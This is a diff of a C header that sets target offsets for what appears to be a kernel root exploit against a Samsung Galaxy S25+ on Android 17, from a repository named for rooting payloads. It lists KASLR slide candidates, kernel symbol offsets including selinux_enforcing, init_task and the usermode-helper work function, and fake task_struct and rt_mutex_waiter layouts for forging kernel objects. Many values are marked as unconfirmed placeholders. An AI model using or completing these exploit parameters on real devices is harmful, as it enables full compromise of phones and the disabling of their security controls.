@@ -2,15 +2,26 @@
 #define OFFSET_H
 
 /*
- * WARNING — PLACEHOLDER OFFSETS
+ * Target: Samsung Galaxy S25+ (pa2q, SM-S936U1)
+ * Firmware: S936U1UEUCZZHL
+ * Android: 17 (API 37)
+ * Kernel: 6.6.127 (Exynos 2500)
  *
- * All symbol _OFF values below were copied from pa2q-S9360ZCSCCZG1
- * (Android 16, kernel 6.1).  The S936U1UEUCZZHL target ships Android 17
- * on kernel 6.6.127 (Exynos 2500).  These offsets WILL be wrong and will
- * produce a mis-exploit (silent wrong-address write) rather than a clean
- * failure.  Do NOT ship or side-load a build from this target until every
- * TODO below is replaced with a value extracted from a live SM-S936U1 or
- * the Samsung OSS vmlinux for S936USQUCZZHL.
+ * WARNING — PLACEHOLDER OFFSETS
+ * Symbol _OFF values below are carried from f1q-S931BXXSAAZI1 (SM-S931B,
+ * kernel 6.6.127, same SoC).  They are much closer than the old S9360ZCSCCZG1
+ * (kernel 6.1) values that were here before, but they are NOT confirmed for
+ * this specific firmware build.  Symbols compiled into the US-unlocked carrier
+ * variant (S936U1UEUCZZHL) may differ from the EUR_OPEN S931B build.
+ *
+ * Struct-layout offsets (FAKE_TASK_*, FAKE_WAITER_*, PWQ_*, FOPS_*) have been
+ * updated for kernel 6.6 from f1q and should be correct unless Samsung carries
+ * downstream patches that alter these structures.
+ *
+ * Replace every "TODO" comment below with a confirmed value from:
+ *   adb shell grep <symbol> /proc/kallsyms  (rooted device, kptr_restrict=0)
+ * or:
+ *   nm -n vmlinux | grep <symbol>           (Samsung OSS drop for S936U1UEUCZZHL)
  *
  * See: https://github.com/TheFlood424K/Root-My-Galaxy-Payloads/issues/8
  */
@@ -25,193 +36,253 @@
 #define BUILD_FINGERPRINT "samsung/pa2quew/pa2q:17/CP2A.260605.016/S936U1UEUCZZHL_OYMCZZHL:user/release-keys"
 #endif
 
-/* TODO: verify KIMAGE_TEXT_BASE for kernel 6.6.127 on Exynos 2500.
- *       Placeholder is copied from S9360ZCSCCZG1 (kernel 6.1). */
-#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL /* TODO */
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL
-#define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL /* TODO: confirm for Exynos 2500 / 6.6 */
-#define SKB_DATA_DELTA (-0xe80LL)
-#define SLIDE_FAKE_WAITER_PRIO 0
-#define SLIDE_WAITER_WAKE_STATE 0
-#define SLIDE_LOCK_OWNER_VALUE 1ULL
-#define SLIDE_USE_FAKE_TASK 1
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d97ecULL /* TODO */
+/* ------------------------------------------------------------------ */
+/* KASLR / memory-map constants (from f1q-S931BXXSAAZI1, kernel 6.6)  */
+/* ------------------------------------------------------------------ */
+#define KIMAGE_TEXT_BASE        0xffffffc008000000ULL
+#define P0_PAGE_OFFSET          0xffffff8000000000ULL
+#define P0_PHYS_OFFSET          0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD     0x80080000ULL
+
+#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
+#define DIRECT_MAP_BASE              0xffffff8000000000ULL
+#define DIRECT_MAP_END               0xffffff9000000000ULL
+#define VMEMMAP_START                0xfffffffe00000000ULL
+
+/* ------------------------------------------------------------------ */
+/* SKB / slide constants                                               */
+/* ------------------------------------------------------------------ */
+#define SKB_DATA_DELTA              (-0x1000LL)
+#define SLIDE_S928_SKB_DATA_DELTA   (-0xe80LL)
+
+#define SLIDE_FAKE_WAITER_PRIO      0
+#define SLIDE_WAITER_WAKE_STATE     0
+#define SLIDE_LOCK_OWNER_VALUE      1ULL
+#define SLIDE_USE_FAKE_TASK         1
+#define COMPACT_RT_MUTEX_WAITER     1
+
+/* TODO: verify both values from live S936U1UEUCZZHL device:
+ *   adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
+ *   nm vmlinux | grep worker_thread  (schedule-path site)
+ * Then uncomment APP_TRACEFS_KASLR_DIRECT.
+ */
+#define SLIDE_TRACEFS_EVENT_ID          106   /* TODO: verify for S936U1UEUCZZHL */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL  /* TODO: verify */
+/* #define APP_TRACEFS_KASLR_DIRECT        1 */
+
+#define SLIDE_PSELECT_WORD_SHIFT    3
 #define SLIDE_P0_OFFSET_CANDIDATES \
-  0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
-  0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
-  0x160000ULL, 0x0e0000ULL, 0x1e0000ULL, 0x000000ULL, \
-  0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, \
-  0x060000ULL, 0x070000ULL, 0x080000ULL, 0x0a0000ULL, \
-  0x0c0000ULL, 0x0d0000ULL, 0x0f0000ULL, 0x110000ULL, \
-  0x120000ULL, 0x0b0000ULL, 0x170000ULL, 0x140000ULL, \
-  0x190000ULL, 0x1b0000ULL, 0x1d0000ULL, 0x1f0000ULL
+  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
+  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
+  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
+  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
+  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
+  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
+  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
+  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
 #define SLIDE_MAX_ATTEMPTS 32
+
+/* ------------------------------------------------------------------ */
+/* App-payload tuning                                                  */
+/* ------------------------------------------------------------------ */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define ROUTE_WAIT_SECONDS 8
-#define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
-#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
+#define ROUTE_WAIT_SECONDS              8
+#define PSELECT_ENTER_DELAY_USEC        50000
+#define SLIDE_PSELECT_TIMEOUT_NSEC      100000000L
+#define SLIDE_KSNITCH_APPENDED_FUTEXES  2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
-#define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 4
-#define SLIDE_BANK_TASK_OFF 0x1000
-#define SLIDE_BANK_TASK_STRIDE 0x1c0
-#define SLIDE_BANK_LOCK_OFF 0x5200
-#define SLIDE_BANK_SLOT_STRIDE 0x100
-#define SLIDE_BANK_WAITER_OFF 0x40
-#define P0_ORACLE_GATE_SLOT 0
-#define P0_ORACLE_PROBE_SLOT 1
-#define P0_ORACLE_GATE_RESTORE_SLOT 2
-#define P0_ORACLE_PROBE_RESTORE_SLOT 3
-#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
-#define P0_ORACLE_GATE_OBJECT_INDEX 1
-#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
+#define SLIDE_KSNITCH_AVERAGE           8
+#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
+  50000, 50000, 50000, 50000, 50000, 50000, 50000, 50000
+#define SLIDE_BANK_SLOTS                4
+#define SLIDE_BANK_TASK_OFF             0x1000
+#define SLIDE_BANK_TASK_STRIDE          0x1c0
+#define SLIDE_S928_BANK_TASK_STRIDE     0xa00
+#define SLIDE_S928_BANK_LOCK_OWNER_TASK 1
+#define SLIDE_BANK_LOCK_OFF             0x5200
+#define SLIDE_S928_BANK_LOCK_BASE       0x0ea0
+#define SLIDE_S928_BANK_LOCK_SHIFT      10
+#define SLIDE_S928_BANK_LOCK_BUCKET_MASK 0x1f
+#define SLIDE_S928_BANK_LOCK_MAX_BUCKET 27
+#define SLIDE_S928_TASK_OFF_CANDIDATES  0x1000, 0x4000
+#define FOPS_S928_TASK_OFF_CANDIDATES   0x1000, 0x6000, 0x7000
+#define SLIDE_BANK_SLOT_STRIDE          0x100
+#define SLIDE_BANK_WAITER_OFF           0x40
+#define P0_ORACLE_GATE_SLOT             0
+#define P0_ORACLE_PROBE_SLOT            1
+#define P0_ORACLE_GATE_RESTORE_SLOT     2
+#define P0_ORACLE_PROBE_RESTORE_SLOT    3
+#define SLIDE_S928_PROBE_PARENT_OFF     0x20
+#define SLIDE_S928_PROBE_TARGET_IMAGE_OFF 0x023bb5b0ULL  /* TODO: update to confirmed ASHMEM_MISC_FOPS_OFF */
+#define P0_ORACLE_GATE_PAGE_OFF         0x0e80
+#define P0_ORACLE_GATE_OBJECT_INDEX     1
+#define P0_ORACLE_PROBE_OFFSET          0x1f0000ULL
 #define P0_FINGERPRINT_HEADER \
   "targets/pa2q-S936U1UEUCZZHL/p0_fingerprint.h"
 #endif
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffff9000000000ULL
-#define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* ----- Symbol offsets — all TODO: replace from S936U1UEUCZZHL kallsyms ----- */
-#define ASHMEM_MISC_FOPS_OFF 0x0247d7f0ULL /* TODO */
-#define ASHMEM_FOPS_OFF 0x0140b440ULL /* TODO */
-#define ASHMEM_IOCTL_OFF 0x00d70dfcULL /* TODO */
-#define ASHMEM_COMPAT_IOCTL_OFF 0x00d714b8ULL /* TODO */
-#define ASHMEM_MMAP_OFF 0x00d7150cULL /* TODO */
-#define ASHMEM_OPEN_OFF 0x00d7172cULL /* TODO */
-#define ASHMEM_RELEASE_OFF 0x00d717b4ULL /* TODO */
-#define ASHMEM_SHOW_FDINFO_OFF 0x00d71840ULL /* TODO */
-#define CONFIGFS_READ_ITER_OFF 0x004954b8ULL /* TODO */
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004959e4ULL /* TODO */
-#define COPY_SPLICE_READ_OFF 0x00416970ULL /* TODO */
-#define NOOP_LLSEEK_OFF 0x003c9450ULL /* TODO */
-#define INIT_TASK_OFF 0x0230e4c0ULL /* TODO */
-#define ROOT_TASK_GROUP_OFF 0x0251cd80ULL /* TODO */
-#define SELINUX_ENFORCING_OFF 0x0255f5c0ULL /* TODO */
-#define KMALLOC_CACHES_OFF 0x017dac30ULL /* TODO */
-#define ANON_PIPE_BUF_OPS_OFF 0x0124cdc8ULL /* TODO */
+/* ------------------------------------------------------------------ */
+/* Kernel symbol offsets — TODO: replace with real nm values           */
+/* Placeholders from f1q-S931BXXSAAZI1 (same SoC, same kernel 6.6.127)*/
+/* ------------------------------------------------------------------ */
+#define ASHMEM_MISC_FOPS_OFF            0x023bb5b0ULL  /* TODO */
+#define ASHMEM_FOPS_OFF                 0x013d1140ULL  /* TODO */
+#define ASHMEM_IOCTL_OFF                0x00d3a314ULL  /* TODO */
+#define ASHMEM_COMPAT_IOCTL_OFF         0x00d3ac4cULL  /* TODO */
+#define ASHMEM_MMAP_OFF                 0x00d3aca4ULL  /* TODO */
+#define ASHMEM_OPEN_OFF                 0x00d3aed0ULL  /* TODO */
+#define ASHMEM_RELEASE_OFF              0x00d3af58ULL  /* TODO */
+#define ASHMEM_SHOW_FDINFO_OFF          0x00d3b078ULL  /* TODO */
+#define CONFIGFS_READ_ITER_OFF          0x004712a4ULL  /* TODO */
+#define CONFIGFS_BIN_WRITE_ITER_OFF     0x004717d4ULL  /* TODO */
+#define COPY_SPLICE_READ_OFF            0x003ef340ULL  /* TODO */
+#define NOOP_LLSEEK_OFF                 0x003a14e4ULL  /* TODO */
+#define INIT_TASK_OFF                   0x0224f8c0ULL  /* TODO */
+#define ROOT_TASK_GROUP_OFF             0x0244cd80ULL  /* TODO */
+#define SELINUX_ENFORCING_OFF           0x02521588ULL  /* TODO */
+#define KMALLOC_CACHES_OFF              0x0176c6f8ULL  /* TODO */
+#define ANON_PIPE_BUF_OPS_OFF           0x01219d90ULL  /* TODO */
 
-#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
-#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
-#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_MISC_FOPS  (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS       (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL      (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
 #define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
-#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
-#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
-#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_MMAP       (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN       (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE    (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
 #define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
 #define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
 #define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
-#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
-#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
-#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define COPY_SPLICE_READ  (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK       (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define INIT_TASK         (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP   (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
-#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define KMALLOC_CACHES    (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+
+/* ------------------------------------------------------------------ */
+/* UMH / work-queue plumbing                                           */
+/* ------------------------------------------------------------------ */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0eacULL /* TODO */
-#define SYSTEM_UNBOUND_WQ_OFF 0x022fae60ULL /* TODO */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d39ccULL  /* TODO */
+#define SYSTEM_UNBOUND_WQ_OFF             0x0223ae60ULL  /* TODO */
 #define CALL_USERMODEHELPER_EXEC_WORK \
   (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
-#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define SYSTEM_UNBOUND_WQ \
+  (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 #define ROOT_UMH_WORK_OFF 0x6000
 #define ROOT_UMH_DATA_OFF 0x6200
 
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0175e75dULL /* TODO */
-#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02302278ULL /* TODO */
-#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02439490ULL /* TODO */
-#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
-#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF 0x026426d8ULL /* TODO */
-#define SLIDE_TRACEFS_EVENT_ID 0 /* TODO: adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id */
-/* #define APP_TRACEFS_KASLR_DIRECT 1 */ /* TODO: uncomment after verifying SLIDE_TRACEFS_EVENT_ID */
-#define SLIDE_S928_PROBE_TARGET_IMAGE_OFF ASHMEM_MISC_FOPS_OFF /* TODO: confirm matches confirmed ASHMEM_MISC_FOPS_OFF */
+/* ------------------------------------------------------------------ */
+/* Slide / netfilter / sysctl helpers                                  */
+/* ------------------------------------------------------------------ */
+#define SLIDE_NFULNL_LOGGER_OFF         0x016a622aULL  /* TODO */
+#define SLIDE_LOGGERS_0_1_OFF           0x02242a20ULL  /* TODO */
+#define SLIDE_RB_PARENT_TYPE_RESTORE    1ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF   0x023762f0ULL  /* TODO */
+#define SLIDE_INIT_TASK_OFF             INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF       ROOT_TASK_GROUP_OFF
+#define SLIDE_SYSCTL_BOOTID_OFF         0x026046e8ULL  /* TODO */
 
-#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
-  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
-#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
-  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
+#define SLIDE_NFULNL_LOGGER_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_LOGGERS_0_1_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE   SLIDE_NFULNL_LOGGER_IMAGE
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE SLIDE_LOGGERS_0_1_IMAGE
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
-  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
-#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+  SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
+#define SLIDE_INIT_TASK_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
 #define SLIDE_ROOT_TASK_GROUP_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
 #define SLIDE_SYSCTL_BOOTID_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-#define LOCK_OFF 0x2210
-#define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
-#define SCRATCH_OFF 0x3000
-#define RIGHT_OFF 0x4440
-#define LEFT_OFF 0x5550
-#define FAKE_TASK_OFF 0x3200
+/* ------------------------------------------------------------------ */
+/* Object layout offsets — kernel 6.6 (Exynos 2500)                   */
+/* Carried from f1q-S931BXXSAAZI1; should not need per-build changes.  */
+/* ------------------------------------------------------------------ */
+#define LOCK_OFF          0x2210
+#define W0_OFF            0x2350
+#define FOPS_OFF          0x2000
+#define SCRATCH_OFF       0x3000
+#define RIGHT_OFF         0x4440
+#define LEFT_OFF          0x5550
+#define FAKE_TASK_OFF     0x3200
 
-#define FAKE_WAITER_TREE_PRIO_OFF 0x18
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
-#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
-#define FAKE_WAITER_TASK_OFF 0x50
-#define FAKE_WAITER_LOCK_OFF 0x58
-#define FAKE_WAITER_WAKE_STATE_OFF 0x60
-#define FAKE_WAITER_WW_CTX_OFF 0x68
+/*
+ * rt_mutex_waiter — kernel 6.4 compact layout (COMPACT_RT_MUTEX_WAITER=1).
+ */
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
+#define FAKE_WAITER_TASK_OFF            0x28
+#define FAKE_WAITER_LOCK_OFF            0x30
+#define FAKE_WAITER_WAKE_STATE_OFF      0x38
+#define FAKE_WAITER_PRIO_OFF            0x3c
+#define FAKE_WAITER_DEADLINE_OFF        0x40
+#define FAKE_WAITER_WW_CTX_OFF          0x48
+#define FAKE_WAITER_LAYOUT_SIZE         0x50
 
-#define FAKE_TASK_USAGE_OFF 0x40
-#define FAKE_TASK_PRIO_OFF 0x84
-#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
-#define FAKE_TASK_TASK_GROUP_OFF 0x348
-#define FAKE_TASK_PI_LOCK_OFF 0x90c
-#define FAKE_TASK_PI_WAITERS_OFF 0x920
-#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
-#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938
+/*
+ * task_struct — kernel 6.6 layout.
+ */
+#define FAKE_TASK_USAGE_OFF             0x40
+#define FAKE_TASK_PRIO_OFF              0x88
+#define FAKE_TASK_NORMAL_PRIO_OFF       0x90
+#define FAKE_TASK_TASK_GROUP_OFF        0x358
+#define FAKE_TASK_PI_LOCK_OFF           0x940
+#define FAKE_TASK_PI_WAITERS_OFF        0x954
+#define FAKE_TASK_PI_TOP_TASK_OFF       0x964
+#define FAKE_TASK_PI_BLOCKED_ON_OFF     0x96c
 
-#define CFG_PAGE_OFF 16
+#define CFG_PAGE_OFF            16
 #define CFG_NEEDS_READ_FILL_OFF 80
-#define CFG_BIN_BUFFER_OFF 88
+#define CFG_BIN_BUFFER_OFF      88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
-#define CFG_CB_MAX_SIZE_OFF 100
+#define CFG_CB_MAX_SIZE_OFF     100
 
-#define WQ_DFL_PWQ_OFF 0xb0
-#define PWQ_POOL_OFF 0x00
-#define PWQ_WQ_OFF 0x08
-#define PWQ_WORK_COLOR_OFF 0x10
-#define PWQ_REFCNT_OFF 0x18
+/*
+ * workqueue / pool_workqueue — kernel 6.5+ offsets.
+ */
+#define WQ_DFL_PWQ_OFF      0xb0
+#define PWQ_POOL_OFF        0x00
+#define PWQ_WQ_OFF          0x08
+#define PWQ_WORK_COLOR_OFF  0x10
+#define PWQ_REFCNT_OFF      0x18
 #define PWQ_NR_IN_FLIGHT_OFF 0x1c
-#define PWQ_NR_ACTIVE_OFF 0x5c
-#define PWQ_MAX_ACTIVE_OFF 0x60
-#define POOL_WORKLIST_OFF 0x28
-#define POOL_NR_IDLE_OFF 0x3c
+#define PWQ_NR_ACTIVE_OFF   0x60
+#define PWQ_MAX_ACTIVE_OFF  0x64
+#define POOL_WORKLIST_OFF   0x28
+#define POOL_NR_IDLE_OFF    0x3c
 
-#define WORK_DATA_OFF 0x00
+#define WORK_DATA_OFF  0x00
 #define WORK_ENTRY_OFF 0x08
-#define WORK_FUNC_OFF 0x18
+#define WORK_FUNC_OFF  0x18
 
-#define STRUCT_PAGE_SIZE 0x40
+#define STRUCT_PAGE_SIZE              0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF 0x08
-#define STRUCT_PAGE_TYPE_OFF 0x30
+#define STRUCT_SLAB_CACHE_OFF         0x18
+#define STRUCT_PAGE_TYPE_OFF          0x30
 
-#define PIPE_BUFFER_SLOTS 32
+#define PIPE_BUFFER_SLOTS       32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
-#define FOPS_OWNER_OFF 0x00
-#define FOPS_LLSEEK_OFF 0x08
-#define FOPS_READ_OFF 0x10
-#define FOPS_WRITE_OFF 0x18
-#define FOPS_READ_ITER_OFF 0x20
-#define FOPS_WRITE_ITER_OFF 0x28
-#define FOPS_IOCTL_OFF 0x48
-#define FOPS_COMPAT_IOCTL_OFF 0x50
-#define FOPS_MMAP_OFF 0x58
-#define FOPS_OPEN_OFF 0x68
-#define FOPS_RELEASE_OFF 0x78
-#define FOPS_SPLICE_READ_OFF 0xb8
-#define FOPS_SHOW_FDINFO_OFF 0xd8
+#define FOPS_OWNER_OFF        0x00
+#define FOPS_LLSEEK_OFF       0x08
+#define FOPS_READ_OFF         0x10
+#define FOPS_WRITE_OFF        0x18
+#define FOPS_READ_ITER_OFF    0x20
+#define FOPS_WRITE_ITER_OFF   0x28
+#define FOPS_IOCTL_OFF        0x50
+#define FOPS_COMPAT_IOCTL_OFF 0x58
+#define FOPS_MMAP_OFF         0x60
+#define FOPS_OPEN_OFF         0x70
+#define FOPS_RELEASE_OFF      0x80
+#define FOPS_SPLICE_READ_OFF  0xc8
+#define FOPS_SHOW_FDINFO_OFF  0xe0
 
-#endif
+#endif /* OFFSET_H */
